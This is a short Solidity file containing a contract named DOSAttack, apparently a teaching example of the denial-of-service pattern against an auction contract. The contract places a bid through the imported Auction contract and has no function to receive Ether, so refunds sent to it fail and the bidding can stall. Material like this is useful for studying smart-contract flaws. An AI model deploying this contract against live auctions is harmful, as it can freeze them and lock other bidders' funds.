// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Auction.sol";

contract DOSAttack {
    Auction public auction;

    constructor(address _auction) {
        auction = Auction(_auction);
    }

    function attack() external payable {
        auction.placeBid{ value: msg.value }();
    }
}
